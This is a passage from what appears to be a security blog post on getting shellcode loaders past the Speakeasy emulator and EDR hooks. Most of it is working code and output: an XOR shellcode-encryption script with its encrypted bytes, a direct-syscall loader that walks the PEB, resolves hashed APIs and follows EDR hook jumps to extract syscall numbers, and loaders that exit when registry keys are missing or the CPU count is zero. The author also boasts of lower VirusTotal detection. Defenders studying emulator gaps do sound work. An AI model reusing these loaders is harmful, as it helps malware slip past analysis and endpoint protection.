Artifact Error Key: 0x00000002
IDT Limit:          0x00000FFF
Temporal Key:       0x00000000
[*] Final MasterKey:    0xF07EC6F3
shellcode[0] (Plaintext): 0x000000FC
```

Now that we have the masterkey, we can compute the encrypted shellcode via a python script:
```py
import struct

master_key = 0xf07ec6f3
original_shellcode = (
    b"\xfc\x48\x83..."
)

def xor_encrypt(data, key):
    key_bytes = struct.pack("<I", key)
    encrypted = bytearray()
    for i in range(len(data)):
        encrypted.append(data[i] ^ key_bytes[i % 4])
    return encrypted

def format_c_array(name, data):
    hex_data = [f"\\x{b:02x}" for b in data]
    chunked = [hex_data[i:i+15] for i in range(0, len(hex_data), 15)]
    formatted = '    "' + '"\n    "'.join(["".join(chunk) for chunk in chunked]) + '";'
    return f"unsigned char {name}[] = \n{formatted}"

encrypted_shellcode = xor_encrypt(original_shellcode, master_key)

print(f"MasterKey: {hex(master_key)}")
print(format_c_array("encrypted_buf", encrypted_shellcode))
```

And like this, we copied the encrypted shellcode into our template:
```
└─$ python get_enc_shellcode.py
MasterKey: 0xf07ec6f3
unsigned char encrypted_buf[] = 
    "\x0f\x8e\xfd\x14\x03\x2e\xbe\xf0\xf3\xc6\x3f\xa1\xb2\x96\x2c"
    "\xa1\xa5\x8e\x4f\x22\x96\x8e\xf5\xa2\x93\x8e\xf5\xa2\xeb\x8e"
    "\xf5\xa2\xd3\x8e\xf5\x82\xa3\x8e\x71\x47\xb9\x8c\x33\xc1\x3a"
    "\x8e\x4f\x30\x5f\xfa\x1f\x8c\xf1\xea\x5e\xb1\x32\x0f\x73\xb1"
    "\xf2\x07\x9c\x1d\xa1\x87\x2f\xb8\x78\x94\x5e\x7b\xb1\xfa\x36"
    "\xf1\x23\x4d\xfe\x78\xf3\xc6\x7e\xb8\x76\x06\x0a\x97\xbb\xc7"
    "\xae\xa0\x78\x8e\x66\xb4\x78\x86\x5e\xb9\xf2\x16\x9d\xa6\xbb"
    "\x39\xb7\xb1\x78\xf2\xf6\xb8\xf2\x10\x33\xc1\x3a\x8e\x4f\x30"
    "\x5f\x87\xbf\x39\xfe\x87\x7f\x31\xcb\x26\x0b\x01\xbf\xc5\x32"
    "\xd4\xfb\x83\x47\x21\x86\x1e\x26\xb4\x78\x86\x5a\xb9\xf2\x16"
    "\x18\xb1\x78\xca\x36\xb4\x78\x86\x62\xb9\xf2\x16\x3f\x7b\xf7"
    "\x4e\x36\xf1\x23\x87\x26\xb1\xab\x98\x27\xaa\xb2\x9e\x3f\xa9"
    "\xb2\x9c\x36\x73\x1f\xe6\x3f\xa2\x0c\x26\x26\xb1\xaa\x9c\x36"
    "\x7b\xe1\x2f\x29\x0f\x0c\x39\x23\xb8\x49\xc7\x7e\xf0\xf3\xc6"
    "\x7e\xf0\xf3\x8e\xf3\x7d\xf2\xc7\x7e\xf0\xb2\x7c\x4f\x7b\x9c"
    "\x41\x81\x25\x48\x26\x63\xda\xf9\x87\xc4\x56\x66\x7b\xe3\x0f"
    "\x26\x8e\xfd\x34\xdb\xfa\x78\x8c\xf9\x46\x85\x10\x86\xc3\xc5"
    "\xb7\xe0\xb4\x11\x9a\xf3\x9f\x3f\x79\x29\x39\xab\x93\x92\xaa"
    "\x1d\xf0";
```

The outcome of running it on SpeakEasy vs real Windows was expected:
![masterkey_poc](/posts/bypassingspeakeasy/masterkey_poc.gif)

What I was curious about was the results on VirusTotal, because the sample that had the plain shellcode was getting around ~26 hits as malicious. So I wanted to see how this sample scored:  

![vt_results](/posts/bypassingspeakeasy/vt_results.png)

## Technique 3: Usermode hooks bypasses via Syscalls
Now that we warmed up from having tested the timing techniques and developed a more advanced way of encrypting our shellcode, we can now move into syscalls, yet another technique of bypassing emulation.

Standard Windows fucntions like VirtualAlloc follow a predictable path: **Kernel32.dll** $\rightarrow$ **KernelBase.dll** $\rightarrow$ **ntdll.dll**. The final tsansition from user mode (Ring 3) to the Kernel (Ring 0) happens inside `ntdll.dll` using the syscall instruction.

EDRs monitor this chain via hooks, where emulators like Speakeasy rely on hooking the high-level API entrypoints in `Kernel32.dll` or `ntdll.dll` to simulate their behavior in python. If a sample uses standard calls, Speakeasy intercepts them and returns the simulated results.

By implementing direct syscalls, we can potentially bypass these emulation hooks entirely. Instead of calling the functions Speakeasy has hooked, our payload will manually prepare the stack and execute the `syscall` instruction itself. If the emulator lacks a low-level engine to catch raw syscall instructions, it will fail to track memory allocations or thread creations, and thus fail to emulate the sample.  

*In simpler terms, we will try and talk directly to the kernel.*

To implement this, I drew inspiration from [RedOps article](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls) and the structure of their [GitHub project](https://github.com/VirtualAlllocEx/Direct-Syscalls-vs-Indirect-Syscalls/tree/main/Direct_Syscalls_Create_Thread/Direct_Syscalls_Create_Thread). 
As said before, instead of asking Windows to allocate memory via a standard DLL, we will mimic the instructions the OS uses and talk to the CPU ourselves.

Following the approach of the RedOps project, I will create and use the following:
- syscalls.s: A raw assembly file that handles the mov r10, rcx transition and executes the syscall instruction.
- syscalls.h: The header file defining our Native function prototypes.
- Code: Our code that will directly talk to the kernel via direct syscalls.

### Syscalls.s
The contents of syscalls.s:
```x86asm
.intel_syntax noprefix

.global NtAllocateVirtualMemory
.global NtProtectVirtualMemory
.global NtWriteVirtualMemory
.global NtCreateThreadEx
.global NtWaitForSingleObject

.extern wNtAllocateVirtualMemory
.extern wNtProtectVirtualMemory
.extern wNtWriteVirtualMemory
.extern wNtCreateThreadEx
.extern wNtWaitForSingleObject

.section .text

NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, [rip + wNtAllocateVirtualMemory]
    syscall
    ret

NtProtectVirtualMemory:
    mov r10, rcx
    mov eax, [rip + wNtProtectVirtualMemory]
    syscall
    ret

NtWriteVirtualMemory:
    mov r10, rcx
    mov eax, [rip + wNtWriteVirtualMemory]
    syscall
    ret

NtCreateThreadEx:
    mov r10, rcx
    mov eax, [rip + wNtCreateThreadEx]
    syscall
    ret

NtWaitForSingleObject:
    mov r10, rcx
    mov eax, [rip + wNtWaitForSingleObject]
    syscall
    ret
```

### Syscalls.h
The contents of syscalls.h:
```c
#ifndef _SYSCALLS_H
#define _SYSCALLS_H

#include <windows.h>

typedef long NTSTATUS;

extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

extern NTSTATUS NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID lpStartAddress,
    PVOID lpParameter,
    ULONG Flags,
    SIZE_T StackZeroBits,
    SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve,
    PVOID lpBytesBuffer
);

extern NTSTATUS NtWaitForSingleObject(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

#endif
```

### Code
The development part will follow the logic of:
1. Compute new hashes for the new Native names. We are now moving from `VirtualAlloc` to `NtAllocateVirtualMemory`. Since the strings changed, so will the hashes.
2. Scans for the 0xB8 opcode (mov eax), finding the SSN even if the function is hooked or the stub is slightly modified by a specific Windows build.
3. Putting everything together.

We can now start!

#### 1. Compute new hashes
We will use our hashing algorithm script and add print statements for the new APIs:
```
└-$ python add_65599.py 
Hash for NtAllocateVirtualMemory: 0x2ED1F2C9
Hash for NtProtectVirtualMemory: 0xEC895023
Hash for NtCreateThreadEx: 0xE7BFA8FF
Hash for NtWaitForSingleObject: 0x22291615
```

#### 2. SSNs
A concept we need to cover before moving to the code is `Syscall Service Numbers (SSNs)`. Every system call function in Windows (such as `NtAllocateVirtualMemory`) starts with  a standard assembly pattern:
```x86asm
mov eax, 0x18   ; 0x18 is the SSN for NtAllocateVirtualMemory
mov r10, rcx
syscall
ret
```

When a request to a service like allocating memory occurs, the CPU does not recognize the string name `NtAllocateVirtualMemory`. Instead, it uses an index number (in this example `0x18`) to identify the specific kernel service requested.  

The machine code (OPCODE) for the command `mov eax, [value]` is `0xB8`. Since emulators and CPUs process binary opcodes rather than text based assembly, our code scans the memory of `ntdll.dll` for this `0xB8` byte. Once located, we read the subsequent 4 bytes to extract the actual SSN. This dynamic approach makes sure the sample is compatible in different Windows versions where these index numbers might be different which makes hardcoding inefficient.

The function we will use to extract the SSN is as follows:
```c
uint32_t ExtractSSN(uint8_t* pFunc) {
    if (!pFunc) return 0;

    if (pFunc[0] == 0xE9) {
        int32_t offset = *(int32_t*)(pFunc + 1);
        pFunc = pFunc + 5 + offset; 
    }

    for (int i = 0; i < 32; i++) {
        if (pFunc[i] == 0xB8) {
            return *(uint32_t*)(pFunc + i + 1);
        }
    }
    return 0;
}
```
**Overview**:  
1. To **locate the SSN**, if `pFunc[i]` matches `0xB8`, the code skips that specific opcode byte (`i+1`) and casts the next 4 bytes into a `uint32_t` to retrieve the SSN.
2. The check for `0xE9` (the opcode for a `relative JMP`) is included for a more concrete sample. [EDR's often hook suspicious APIs](https://www.zerohuntlabs.com/research-and-development/endpoint-detection-and-response) (*section `API Unhooking for AV Bypass`*) by overwriting the function entry with a jump to a scanning engine.
    - The command `int32_t offset = *(int32_t*)(pFunc + 1);` extracts the 4-byte jump distance.
    - The command `pFunc = pFunc + 5 + offset;` calculates the jump destination by adding the offset to the current address plus the 5-byte size of the jump instruction itself.

If an `0xE9` opcode is detected, it means that a security solution has redirected the API call to a scanning engine. Our logic calculates the destination of this redirection (`pFunc + 5 + offset`) to locate the original system call instructions. By following this jump, we end up bypassing the security checkpoint and retrieve the necessary SSN from the original unmodified stub.  

A dummy overview of this is the following:
```x86asm
; ntdll!NtAllocateVirtualMemory (Hooked)
0x7ff1000:  E9 50 20 00 00    jmp 0x7ff3055  ; <--- This is the 0xE9 jump to the EDR
0x7ff1005:  0F 05             syscall        
0x7ff1007:  C3                ret
```

The CPU follows that `0xE9` jump to the EDR's memory at `0x7ff3055`:
```x86asm
; EDR_Engine.dll
0x7ff3055:  <...Scanning Logic...>     ; EDR checks if our logic is malicious
0x7ff30A0:  B8 18 00 00 00             ; mov eax, 0x18 (The original instruction)
0x7ff30A5:  4C 8B D1                   ; mov r10, rcx
0x7ff30A8:  E9 58 DF FF FF             ; jmp 0x7ff1005 (Jump back to the real syscall)
```

So in case you are confused as to why we care of calculating the destination of the redirection, it is to locate the actual part of where our syscall is executed and redirect the flow there.

> A [real world example](https://scispace.com/pdf/an-analysis-of-conti-ransomware-leaked-source-codes-2f2en2x4.pdf) you can read is the one of Conti ransomware, which implemented this technique. It is located in `B. API-UNHOOKING MECHANISM` section.

The last thing we need to address is an alternative way of walking the PEB.  
In our previous way of doing this, we defined `MY_PEB` and `MY_LDR_DATA_TABLE_ENTRY`. We were essentially showing the compiler how to treat memory based on this specific mapping. It was a good way in terms of readibility (using `peb->Ldr` instead of doing math). It was risky on the other hand since we assumed `DllBase` was at a specific spot because of our struct definition. 

We will be now using a different approach, mimicking how the windows kernel itself navigates. For a standard `ResolveApi` (like finding `VirtualAlloc`), our previous way is fine because `VirtualAlloc` is easy to find, but for **direct syscalls**, we are doing something "*illegal*" in the eyes of the OS - we are manually parsing ntdll.dll to find kernel indices. 

**What does *illegal* mean?**
> - In windows architecture, we have the concept of **Abstraction**. Microsoft provies a way to do things: you call `VirtualAlloc` in `Kernel32.dll`, which safely hands us off to `ntdll.dll`, which then safely executes a syscall. 
> 
> - By manually searching through the internal memory of `ntdll.dll` for `0xB8` (the `mov eax` opcode), we are bypassing the security monitoring. We aren't asking for permission to allocate memory, but rather "stealing" the "keys" (the SSNs) so we can do it ourselfs.
>
> - So, our new PEB walk will use raw offsets to locate what is needed, because it is how the kernel itself navigates. 
> 
> - When the `ntdll.dll` needs to find a module, it does not use a high level C abstraction but rather an optimized assembly level pointer math.
>  
> - While the names of variables in a C struct might change or be renamed in a new SDK (at compilation time), the binary offset (like `0x60` for the PEB or `0x18` for the LDR) is a hardcoded constant in the Windows Kernel's own source code. If we take a look at the dissasembly of any internal Windows function that accesses the PEB, we will see instructions like `mov rax, gs:[60h]`, `mov rax, [rax+18h]`.  
>
> - These are the exact raw offsets we will use in our new mathematical PEB walk. The kernel doe snot know the name Ldr, it only knows that the pointer it needs is 24 bytes (`0x18`) from the start of the PEB.0

Here is an additional explanation of the code, before we move into the full sample:
```c
void* NewResolveAPI(uint32_t targetHash) {
    uintptr_t peb = __readgsqword(0x60);

    // Inside the PEB structure, the 'Ldr' is located at offset 0x18
    uintptr_t ldr = *(uintptr_t*)(peb + 0x18);

    // The head of this doubly-linked list is at offset 0x20 from the start of Ldr
    LIST_ENTRY* head = (LIST_ENTRY*)(ldr + 0x20);
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        // The 'DllBase' (the start of the DLL in memory) 
        // is located exactly 0x20 bytes after the LIST_ENTRY pointers
        uintptr_t base = *(uintptr_t*)((uintptr_t)curr + 0x20);
        
        if (base) {
            // Casting the base address to a DOS Header to find the NT Headers
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
            
            // DataDirectory[0] contains the virtual address of the Export Directory
            uint32_t expVA = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
            
            if (expVA > 0) {
                // Map the Export Directory structure
                PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + expVA);
                
                // Get pointers to the arrays of Names, Ordinals, and Function addresses.
                uint32_t* names = (uint32_t*)(base + exp->AddressOfNames);
                uint16_t* ords = (uint16_t*)(base + exp->AddressOfNameOrdinals);
                uint32_t* funcs = (uint32_t*)(base + exp->AddressOfFunctions);

                for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
                    char* name = (char*)(base + names[i]);
                    
                    // Avoid dependency on strlen
                    size_t nlen = 0; while(name[nlen]) nlen++;
                    
                    if (hash((unsigned char*)name, nlen) == targetHash) {
                        return (void*)(base + funcs[ords[i]]);
                    }
                }
            }
        }
        curr = curr->Flink;
    }
    
    return NULL;
}
```

#### 3. Putting everything together
The contents of the poc.c:
```c
#include <windows.h>
#include <stdint.h>

extern NTSTATUS NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern NTSTATUS NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
extern NTSTATUS NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PULONG);
extern NTSTATUS NtCreateThreadEx(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
extern NTSTATUS NtWaitForSingleObject(HANDLE, BOOLEAN, PLARGE_INTEGER);

uint32_t wNtAllocateVirtualMemory = 0;
uint32_t wNtProtectVirtualMemory = 0;
uint32_t wNtWriteVirtualMemory = 0;
uint32_t wNtCreateThreadEx = 0;
uint32_t wNtWaitForSingleObject = 0;

typedef struct _IDTR { USHORT limit; UINT64 base; } __attribute__((packed)) IDTR;

uint32_t hash(const unsigned char* data, size_t len) {
    uint32_t result = 0;
    for (size_t i = 0; i < len; ++i) {
        uint32_t tmp = (uint32_t)data[i] + 32;
        if ((((int)data[i] - (int)'A') & 0xFFFF) > 26) tmp = data[i];
        result = (uint32_t)(tmp + (0x1003F * result));
    }
    return result;
}


+
void* NewResolveAPI(uint32_t targetHash) {
    uintptr_t peb = __readgsqword(0x60);
    uintptr_t ldr = *(uintptr_t*)(peb + 0x18);
    LIST_ENTRY* head = (LIST_ENTRY*)(ldr + 0x20);
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        uintptr_t base = *(uintptr_t*)((uintptr_t)curr + 0x20);
        
        if (base) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
            uint32_t expVA = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
            
            if (expVA > 0) {
                PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + expVA);
                uint32_t* names = (uint32_t*)(base + exp->AddressOfNames);
                uint16_t* ords = (uint16_t*)(base + exp->AddressOfNameOrdinals);
                uint32_t* funcs = (uint32_t*)(base + exp->AddressOfFunctions);

                for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
                    char* name = (char*)(base + names[i]);
                    size_t nlen = 0; while(name[nlen]) nlen++;
                    if (hash((unsigned char*)name, nlen) == targetHash) {
                        return (void*)(base + funcs[ords[i]]);
                    }
                }
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

uint32_t ExtractSSN(uint8_t* pFunc) {
    if (!pFunc) return 0;

    if (pFunc[0] == 0xE9) {
        int32_t offset = *(int32_t*)(pFunc + 1);
        pFunc = pFunc + 5 + offset; 
    }

    for (int i = 0; i < 32; i++) {
        if (pFunc[i] == 0xB8) {
            return *(uint32_t*)(pFunc + i + 1);
        }
    }
    return 0;
}

void EntryPoint() {
    __asm__("and $-16, %rsp");
    __asm__("sub $0x40, %rsp");

    uint8_t* pAlloc   = (uint8_t*)NewResolveAPI(0x2ED1F2C9);
    uint8_t* pProtect = (uint8_t*)NewResolveAPI(0xEC895023);
    uint8_t* pCreate  = (uint8_t*)NewResolveAPI(0xE7BFA8FF);
    uint8_t* pWait    = (uint8_t*)NewResolveAPI(0x22291615);

    if (!pAlloc || !pProtect) {
        ExitProcess(0);
    }

    wNtAllocateVirtualMemory = ExtractSSN(pAlloc);
    wNtProtectVirtualMemory  = ExtractSSN(pProtect);
    wNtCreateThreadEx        = ExtractSSN(pCreate);
    wNtWaitForSingleObject   = ExtractSSN(pWait);

    unsigned char shellcode[] = "\xfc\x48\x83...";

    PVOID base = NULL;
    SIZE_T sz = sizeof(shellcode);

    NTSTATUS st = NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &sz, 0x3000, 0x04);
    if (st == 0) {
        for (int i = 0; i < sizeof(shellcode); i++) {
            ((unsigned char*)base)[i] = shellcode[i];
        }

        ULONG old;
        st = NtProtectVirtualMemory((HANDLE)-1, &base, &sz, 0x20, &old);
        
        if (st == 0) {
            HANDLE hThread = NULL;
            st = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, (HANDLE)-1, base, NULL, FALSE, 0, 0, 0, NULL);
            if (hThread) {
                NtWaitForSingleObject(hThread, FALSE, NULL);
            }
        }
    }
    ExitProcess(0);
}
```
Compiling via `x86_64-w64-mingw32-gcc assembly_approach.c syscalls.s -o assembly_approach.exe -m64 -nostdlib -nostartfiles -Wl,-e,EntryPoint -lkernel32` and running it, it launches the calc.exe, but SpeakEasy once again fails:

![syscalls](/posts/bypassingspeakeasy/syscalls.gif)

and it finishes emulation without resolving anything.

We can of course make our payload even more advanced such as including the time delays, computing the encryption/decryption key etc to add more complexity to it.





## Technique 4 - Static Configuration Artifacts
As a final technique, we will "weaponize" static artifacts found within the SpeakEasy source code or files typically present in a standard Windows installation. This approach is more straightforward than our previous methods, cooling off the previous complexity before we concluding this post.


### HKLM\HARDWARE hive
Similar to our earlier strategy of weaponizing GetLastError() via non-existent files, we will now use the Windows Registry to identify environmental discrepancie. Specifically, we will try to query for `HKLM\HARDWARE\DESCRIPTION\System` and `VideoBiosVersion`, that both seem to be missing:
```
/tmp$ grep -i "HKLM\HARDWARE\DESCRIPTION\System" -r speakeasy
/tmp$ grep -i "VideoBiosVersion" -r speakeasy
```

By utilizing these PoCs, we can verify if specific paths that exist in real Windows systems are missing from SpeakEasy's environment:
```c
// Our usual structs, ResolveAPI, hash functions etc

void WINAPI EntryPoint(void) {
    __asm__("and $-16, %rsp");
    __asm__("sub $0x40, %rsp"); 

    uint32_t h_VirtualAlloc = 0x5ACFDE4A;
    uint32_t h_VirtualProtect = 0x208602E4;
    uint32_t h_CreateThread = 0xA6EE5C26;
    uint32_t h_WaitForSingleObject = 0x12F2951B;

    // calculate new hashes with add_65599.py
    uint32_t h_RegOpenKeyExA = 0x65027B0D; 
    uint32_t h_RegQueryValueExA = 0xC6E75F91;
    uint32_t h_RegCloseKey = 0xB148BB5B;

    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(h_VirtualAlloc);
    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(h_VirtualProtect);
    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);
    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(h_WaitForSingleObject);
    
    PfnRegOpenKeyExA pRegOpenKeyExA = (PfnRegOpenKeyExA)ResolveApi(h_RegOpenKeyExA);
    PfnRegQueryValueExA pRegQueryValueExA = (PfnRegQueryValueExA)ResolveApi(h_RegQueryValueExA);
    PfnRegCloseKey pRegCloseKey = (PfnRegCloseKey)ResolveApi(h_RegCloseKey);

    if (!pVirtualAlloc || !pRegOpenKeyExA) ExitProcess(0xBBBB);


    HKEY hKey;
    char videoBios[256];
    DWORD dwType = REG_SZ;
    DWORD dwSize = sizeof(videoBios);
    
    // Check if HKLM\HARDWARE\DESCRIPTION\System exists
    if (pRegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        // Query VideoBiosVersion
        if (pRegQueryValueExA(hKey, "VideoBiosVersion", NULL, &dwType, (LPBYTE)videoBios, &dwSize) != ERROR_SUCCESS) {
            pRegCloseKey(hKey);
            ExitProcess(0xdead1); // Path exists, but value missing
        }
        pRegCloseKey(hKey);
    } else {
        ExitProcess(0xdead2); // Path doesn't exist (SpeakEasy Failed)
    }

    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem) {
        for (int i = 0; i < sizeof(buf); i++) { ((unsigned char*)exec_mem)[i] = buf[i]; }
        DWORD old;
        if (pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &old)) {
             HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
             if (hThread) { pWaitForSingleObject(hThread, 0xFFFFFFFF); }
        }
    }
    ExitProcess(0);
}
```

Running our sample yields:
```
┌--(connar㉿vbox-kali)-[~/Downloads/poc_speakeasy]
└-$ x86_64-w64-mingw32-gcc -o artifact_bypass.exe bypass.c -m64 -nostdlib -nostartfiles -Wl,-e,EntryPoint -lkernel32 -ladvapi32
                                                                                                                                                                                                                                           
┌--(connar㉿vbox-kali)-[~/Downloads/poc_speakeasy]
└-$ speakeasy -t artifact_bypass.exe                                                                                           
/home/connar/Downloads/speakeasy-1.6.1/venv/lib/python3.13/site-packages/unicorn/unicorn.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
* exec: module_entry
0x1400013b8: 'advapi32.RegOpenKeyExA(0xffffffff80000002, "HARDWARE\\DESCRIPTION\\System", 0x0, 0x20019, 0x13fff38)' -> 0x3
0x140001476: 'KERNEL32.ExitProcess(0xdead2)' -> 0x0
* Finished emulating
```

...whci was expected. **In a real Windows OS**, the `HKLM\HARDWARE` hive is not a static file on the disk but rather a hive created in memory by the kernel during boot. It is populated by drivers (like Vga.sys) to describe the physical components (Video BIOS, CPU types etc).  

SpeakEasy mocks common software registry keys (like Windows version info) so programs don't crash, but it does not simulate the low-level hardware drivers. Therefore, it does not build the `HARDWARE` hive. When our code asks for `HARDWARE\DESCRIPTION\System`, SpeakEasy returns `ERROR_FILE_NOT_FOUND` (exit code 0xdead2) because that part of its environment has not been built yet.


### CPUs
Another technique is with the CPUs. To find where the cpu is probably initialized, I started taking a look at the project files and specifically inside `speakeasy/speakaesy/winenev/defs/windows/kernel32.py` I found this part of code:
```py
class SYSTEM_INFO(EmuStruct):
    def __init__(self, ptr_size):
        super().__init__(ptr_size)
        self.wProcessorArchitecture = ct.c_uint16
        self.dwPageSize = ct.c_uint32
        self.lpMinimumApplicationAddress = Ptr
        self.lpMaximumApplicationAddress = Ptr
        self.dwActiveProcessorMask = Ptr
        self.dwNumberOfProcessors = ct.c_uint32
        self.dwProcessorType = ct.c_uint32
        self.dwAllocationGranularity = ct.c_uint32
        self.wProcessorLevel = ct.c_uint16
        self.wProcessorRevision = ct.c_uint1
```

Taking a look at the implementation of `.../usermode/kernel32.py`, and specifically the hook of `GetSystemInfo`, we find the following:
```py
@apihook('GetSystemInfo', argc=1)
    def GetSystemInfo(self, emu, argv, ctx={}):
        '''
        void GetSystemInfo(
            LPSYSTEM_INFO lpSystemInfo
        );
        '''
        lpSystemInfo, = argv
        ptr_size = emu.get_ptr_size()
        si = self.k32types.SYSTEM_INFO(ptr_size)
        si.dwPageSize = 0x1000

        if ptr_size == 4:
            si.wProcessorArchitecture = k32types.PROCESSOR_ARCHITECTURE_INTEL
        else:
            si.wProcessorArchitecture = k32types.PROCESSOR_ARCHITECTURE_AMD64

        self.mem_write(lpSystemInfo, si.get_bytes())
        return
```

We see no value is being assigned to `dwNumberOfProcessors`. We can also do a recursive grep to verify nowhere in the whole project an assignment is made expect for the SYSTEM_INFO declaration struct:
```
connar@DESKTOP-6465211:/tmp/speakeasy/speakeasy$ grep -i "dwNumberOfProcessors" -r .
./winenv/defs/windows/kernel32.py:        self.dwNumberOfProcessors = ct.c_uint32
```

This means that since no value is being passed to the number of processors, they will be 0. We can verify it by using the following two code snippets:
```c
// ... Rest of template shown later
// Processor Count Check
    SYSTEM_INFO sysInfo;
    pGetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors == 0) {
        ExitProcess(0xdead1);
    }
// ... Rest of template shown later
```

The output is:
```
└-$ speakeasy -t hardwarebypass.exe                                                                                           
/home/connar/Downloads/speakeasy-1.6.1/venv/lib/python3.13/site-packages/unicorn/unicorn.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
* exec: module_entry
0x14000132f: 'kernel32.GetSystemInfo(0x13fff18)' -> None
0x140001344: 'KERNEL32.ExitProcess(0xdead1)' -> 0x0
* Finished emulating
```

We see it exists with the `0xdead1` code.

Now, if we change the comparison from `0` to `1`, we see the following:
```
└-$ speakeasy -t hardwarebypass.exe                                                                                           
/home/connar/Downloads/speakeasy-1.6.1/venv/lib/python3.13/site-packages/unicorn/unicorn.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
* exec: module_entry
0x14000132f: 'kernel32.GetSystemInfo(0x13fff18)' -> None
0x140001361: 'kernel32.VirtualAlloc(0x0, 0x111, 0x3000, "PAGE_READWRITE")' -> 0x50000
0x1400013c9: 'kernel32.VirtualProtect(0x50000, 0x111, 0x20, 0x13fff14)' -> 0x1
0x1400013fb: 'kernel32.CreateThread(0x0, 0x0, 0x50000, 0x0, 0x0, 0x0)' -> 0x220
0x140001419: 'kernel32.WaitForSingleObject(0x220, 0xffffffff)' -> 0x0
0x140001427: 'KERNEL32.ExitProcess(0x0)' -> 0x0
* exec: thread
0x500e4: 'kernel32.WinExec("calc", 0x1)' -> 0x20
0x500f1: 'kernel32.GetVersion()' -> 0x1db10106
```

It emulated correctly.  This means that if we use our initial check of `sysInfo.dwNumberOfProcessors == 0` we can bypass the emulation once again. Full template:
```c
#include <windows.h>
#include <stdint.h>
#include <intrin.h>

// Our usual structs ...

typedef void   (WINAPI *PfnGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL   (WINAPI *PfnGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);

unsigned char buf[] = 
"\xfc\x48\x83...";

uint32_t hash(const unsigned char* data, size_t len) {
    ...
}

void* ResolveApi(uint32_t targetHash) {
    ...
}

void WINAPI EntryPoint(void) {
    // 16-byte stack alignment
    __asm__("and $-16, %rsp");
    __asm__("sub $0x40, %rsp"); 

    uint32_t h_GetSystemInfo = 0xA86FDDD3; 
    uint32_t h_GlobalMemoryStatusEx = 0xD5A504E9;
    uint32_t h_VirtualAlloc = 0x5ACFDE4A;
    uint32_t h_VirtualProtect = 0x208602E4;
    uint32_t h_CreateThread = 0xA6EE5C26;
    uint32_t h_WaitForSingleObject = 0x12F2951B;

    PfnGetSystemInfo pGetSystemInfo = (PfnGetSystemInfo)ResolveApi(h_GetSystemInfo);
    PfnGlobalMemoryStatusEx pGlobalMemoryStatusEx = (PfnGlobalMemoryStatusEx)ResolveApi(h_GlobalMemoryStatusEx);
    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(h_VirtualAlloc);
